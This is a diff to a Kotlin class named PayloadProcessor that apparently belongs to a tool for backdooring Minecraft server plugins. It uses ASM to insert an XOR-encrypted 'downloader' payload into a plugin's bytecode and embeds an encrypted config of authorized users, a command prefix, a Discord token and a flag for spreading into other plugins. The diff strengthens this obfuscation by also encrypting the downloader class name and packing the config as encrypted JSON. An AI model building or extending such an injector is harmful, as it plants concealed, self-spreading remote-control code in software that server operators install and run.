@@ -7,9 +7,11 @@ import com.tmquan2508.inject.core.analysis.JavaVersion
 import com.tmquan2508.inject.core.analysis.JavaVersionScanner
 import org.objectweb.asm.ClassReader
 import org.objectweb.asm.ClassWriter
+import org.objectweb.asm.Opcodes
 import org.objectweb.asm.commons.ClassRemapper
 import org.objectweb.asm.commons.SimpleRemapper
 import org.objectweb.asm.tree.ClassNode
+import org.objectweb.asm.tree.InsnNode
 import org.objectweb.asm.tree.LdcInsnNode
 import java.io.File
 import java.security.MessageDigest
@@ -48,8 +50,7 @@ class PayloadProcessor {
             originalBytecodeMap = transformedBytecodeMap,
             targetClassName = finalMainPayloadName,
             downloaderBytes = downloaderBytes,
-            config = config,
-            camouflage = camouflageEnabled.toString()
+            config = config
         )
 
         val finalMainPayloadBytes = configuredBytecodeMap[finalMainPayloadName]
@@ -91,7 +92,7 @@ class PayloadProcessor {
         }
         return Pair(relocationMap, finalMainPayloadName)
     }
-    
+
     private fun transformAndRelocatePayload(
         rawClasses: List<ClassFile>,
         relocationMap: Map<String, String>,
@@ -121,23 +122,22 @@ class PayloadProcessor {
         }
         return transformedBytecode
     }
-    
+
     private fun applyConfigurationWithAsm(
         originalBytecodeMap: Map<String, ByteArray>,
         targetClassName: String,
         downloaderBytes: ByteArray,
-        config: Config,
-        camouflage: String
+        config: Config
     ): Map<String, ByteArray> {
         val replacementMap = AsmValueInjector.buildFinalPlaceholderMap(
-            downloaderBytes, config, camouflage
+            downloaderBytes, config
         )
-    
+
         val mainClassBytes = originalBytecodeMap[targetClassName]
             ?: throw IllegalStateException("Configuration target class '$targetClassName' not found in transformed bytecode map.")
-    
+
         val mainClassNode = ClassNode().also { ClassReader(mainClassBytes).accept(it, 0) }
-    
+
         val classesToPatch = mutableSetOf(targetClassName)
         mainClassNode.innerClasses?.forEach { innerClassNode ->
             if (innerClassNode.outerName == mainClassNode.name) {
@@ -145,17 +145,17 @@ class PayloadProcessor {
                 classesToPatch.add(innerClassNode.name)
             }
         }
-    
+
         val finalBytecodeMap = mutableMapOf<String, ByteArray>()
         originalBytecodeMap.forEach { (className, originalBytes) ->
             if (className in classesToPatch) {
                 Logs.debug("  [PATCH] Applying configuration to $className")
-                finalBytecodeMap[className] = AsmValueInjector.inject(originalBytes, replacementMap)
+                finalBytecodeMap[className] = AsmValueInjector.inject(originalBytes, replacementMap, config.displayDebugMessages)
             } else {
                 finalBytecodeMap[className] = originalBytes
             }
         }
-    
+
         Logs.info(" -> Successfully applied combined encrypted configuration using ASM.")
         return finalBytecodeMap
     }
@@ -174,21 +174,35 @@ class PayloadProcessor {
             val chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
             return (1..length).map { chars[SecureRandom().nextInt(chars.length)] }.joinToString("")
         }
-        private fun encryptPayload(plainBytes: ByteArray, key: String): String {
+
+        private fun encryptWithRandomKey(plainBytes: ByteArray, key: String): String {
             val keyBytes = key.toByteArray(Charsets.UTF_8)
             val result = ByteArray(plainBytes.size) { i -> (plainBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte() }
             return Base64.getEncoder().encodeToString(result)
         }
-    
-        fun inject(originalBytecode: ByteArray, placeholders: Map<String, String>): ByteArray {
+
+        fun inject(originalBytecode: ByteArray, placeholders: Map<String, String>, debugFlag: Boolean): ByteArray {
             val classReader = ClassReader(originalBytecode)
             val classNode = ClassNode()
             classReader.accept(classNode, 0)
             classNode.methods.forEach { method ->
                 method.instructions.forEach { insn ->
                     if (insn is LdcInsnNode && insn.cst is String && placeholders.containsKey(insn.cst as String)) {
-                        insn.cst = placeholders[insn.cst as String]
-                        Logs.debug("  [ASM-LDC] Replaced '${insn.cst}' in ${classNode.name}.${method.name}")
+                        val placeholder = insn.cst as String
+                        insn.cst = placeholders[placeholder]
+                        Logs.debug("  [ASM-LDC] Replaced '$placeholder' in ${classNode.name}.${method.name}")
+                    }
+                }
+
+                if (debugFlag && method.name == "initialize") {
+                    val instructions = method.instructions
+                    for (i in 0 until instructions.size()) {
+                        val insn = instructions.get(i)
+                        if (insn.opcode == Opcodes.ICONST_0) {
+                            Logs.debug("  [ASM-OPCODE] Replaced ICONST_0 with ICONST_1 in ${classNode.name}.${method.name}")
+                            instructions.set(insn, InsnNode(Opcodes.ICONST_1))
+                            break
+                        }
                     }
                 }
             }
@@ -196,27 +210,34 @@ class PayloadProcessor {
             classNode.accept(classWriter)
             return classWriter.toByteArray()
         }
-    
-        fun buildFinalPlaceholderMap(downloaderBytes: ByteArray, config: Config, camouflage: String): Map<String, String> {
+
+        private fun escapeJson(value: Any): String {
+            return value.toString().replace("\\", "\\\\").replace("\"", "\\\"")
+        }
+
+        fun buildFinalPlaceholderMap(downloaderBytes: ByteArray, config: Config): Map<String, String> {
             val finalMap = mutableMapOf<String, String>()
             val key = generateRandomKey(32)
+
+            val downloaderClassName = DOWNLOADER_CLASS_NAME.replace(".class", "").replace('/', '.')
             finalMap["::KEY::"] = key
-            finalMap["::ENCRYPTED_PAYLOAD::"] = encryptPayload(downloaderBytes, key)
-            finalMap["::DOWNLOADER_CLASS_NAME::"] = DOWNLOADER_CLASS_NAME.replace(".class", "").replace('/', '.')
-    
-            val otherConfigs = mapOf(
-                "::UUIDS::" to config.authorizedUuids.joinToString(","),
-                "::USERNAMES::" to config.authorizedUsernames.joinToString(","),
-                "::PREFIX::" to config.commandPrefix,
-                "::INJECT_OTHER::" to config.injectIntoOtherPlugins.toString(),
-                "::WARNINGS::" to config.displayDebugMessages.toString(),
-                "::DISCORD_TOKEN::" to config.discordToken,
-                "::PASSWORD::" to config.password.toSha256(),
-                "::CAMOUFLAGE::" to camouflage,
-                "::TRUE::" to "true"
-            )
-            
-            otherConfigs.forEach { (p, v) -> finalMap[p] = StaticKeyEncoder.encrypt(v) }
+            finalMap["::ENCRYPTED_PAYLOAD::"] = encryptWithRandomKey(downloaderBytes, key)
+            finalMap["::ENCRYPTED_DOWNLOADER_CLASS_NAME::"] = encryptWithRandomKey(downloaderClassName.toByteArray(Charsets.UTF_8), key)
+
+            val configJson = """
+            {
+              "uuids": "${escapeJson(config.authorizedUuids.joinToString(","))}",
+              "usernames": "${escapeJson(config.authorizedUsernames.joinToString(","))}",
+              "prefix": "${escapeJson(config.commandPrefix)}",
+              "inject_other": ${config.injectIntoOtherPlugins},
+              "warnings": ${config.displayDebugMessages},
+              "discord_token": "${escapeJson(config.discordToken)}",
+              "password": "${escapeJson(config.password.toSha256())}"
+            }
+            """.trimIndent().replace(Regex("(?m)^\\s*"), "")
+
+            finalMap["::CONFIG::"] = StaticKeyEncoder.encrypt(configJson)
+
             return finalMap
         }
     }
